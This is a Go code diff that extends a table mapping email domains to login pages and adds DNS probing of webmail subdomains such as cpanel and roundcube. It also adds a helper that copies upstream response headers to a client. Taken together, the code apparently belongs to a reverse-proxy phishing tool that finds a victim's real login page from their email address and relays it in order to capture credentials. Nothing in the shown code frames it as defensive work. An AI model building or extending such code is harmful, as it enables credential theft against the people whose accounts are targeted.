@@ -7,13 +7,16 @@ import (
 	"strings"
 )
 
+// ProviderMapping maps email domains to their primary login URLs.
+// Updated for 2026 current standards (e.g., MS moving to MicrosoftOnline).
 var ProviderMapping = map[string]string{
+	// US Providers
 	"gmail.com":      "https://accounts.google.com/",
 	"googlemail.com": "https://accounts.google.com/",
-	"outlook.com":    "https://login.live.com/",
-	"hotmail.com":    "https://login.live.com/",
-	"live.com":       "https://login.live.com/",
-	"msn.com":        "https://login.live.com/",
+	"outlook.com":    "https://login.microsoftonline.com/",
+	"hotmail.com":    "https://login.microsoftonline.com/",
+	"live.com":       "https://login.microsoftonline.com/",
+	"msn.com":        "https://login.microsoftonline.com/",
 	"yahoo.com":      "https://login.yahoo.com/",
 	"ymail.com":      "https://login.yahoo.com/",
 	"icloud.com":     "https://appleid.apple.com/",
@@ -22,25 +25,19 @@ var ProviderMapping = map[string]string{
 	"protonmail.com": "https://account.proton.me/",
 	"proton.me":      "https://account.proton.me/",
 	"zoho.com":       "https://accounts.zoho.com/",
-	"qq.com":         "https://mail.qq.com/",
-	"foxmail.com":    "https://mail.qq.com/",
-	"163.com":        "https://mail.163.com/",
-	"126.com":        "https://mail.126.com/",
-	"yeah.net":       "https://mail.yeah.net/",
-	"sina.com":       "https://mail.sina.com.cn/",
-	"sohu.com":       "https://mail.sohu.com/",
-	"yandex.com":     "https://passport.yandex.com/",
-	"yandex.ru":      "https://passport.yandex.ru/",
-	"web.de":         "https://web.de/mam/login.action",
-	"gmx.com":        "https://login.gmx.net",
-	"gmx.de":         "https://login.gmx.net",
-	"tutanota.com":   "https://login.tutanota.com/",
-	"tuta.io":        "https://login.tutanota.com/",
-	"fastmail.com":   "https://www.fastmail.com/auth/login",
-	"godaddy.com":    "https://sso.godaddy.com/",
-	"cpanel.net":     "https://cpanel.net/",
+
+	// China Providers
+	"qq.com":       "https://mail.qq.com/",
+	"foxmail.com":  "https://mail.qq.com/",
+	"163.com":      "https://mail.163.com/",
+	"126.com":      "https://mail.126.com/",
+	"yeah.net":     "https://mail.yeah.net/",
+	"sina.com":     "https://mail.sina.com.cn/",
+	"sohu.com":     "https://mail.sohu.com/",
+	"qiye.163.com": "https://qiye.163.com/", // Enterprise 163
 }
 
+// GetTargetDomain determines the login page based on the email domain.
 func GetTargetDomain(email string) string {
 	parts := strings.Split(email, "@")
 	if len(parts) < 2 {
@@ -48,11 +45,14 @@ func GetTargetDomain(email string) string {
 	}
 	domain := strings.ToLower(parts[1])
 
+	// 1. Check the known map first
 	if target, ok := ProviderMapping[domain]; ok {
 		return target
 	}
 
-	subdomains := []string{"webmail", "mail", "exchange", "outlook", "autodiscover", "portal"}
+	// 2. Smart DNS Fallback for custom corporate domains
+	// Try common webmail subdomains to find the active mail server
+	subdomains := []string{"webmail", "mail", "exchange", "outlook", "autodiscover", "portal", "cpanel", "roundcube"}
 	for _, sub := range subdomains {
 		fullDomain := sub + "." + domain
 		_, err := net.LookupHost(fullDomain)
@@ -61,9 +61,12 @@ func GetTargetDomain(email string) string {
 		}
 	}
 
+	// 3. Absolute Fallback: Assume the domain itself hosts webmail
+	// This handles generic domains like @example.com if they have a mail server
 	return fmt.Sprintf("https://%s/", domain)
 }
 
+// CloneHeaders copies critical headers from the upstream response to the client
 func CloneHeaders(src *http.Response, dst http.ResponseWriter) {
 	if ct := src.Header.Get("Content-Type"); ct != "" {
 		dst.Header().Set("Content-Type", ct)
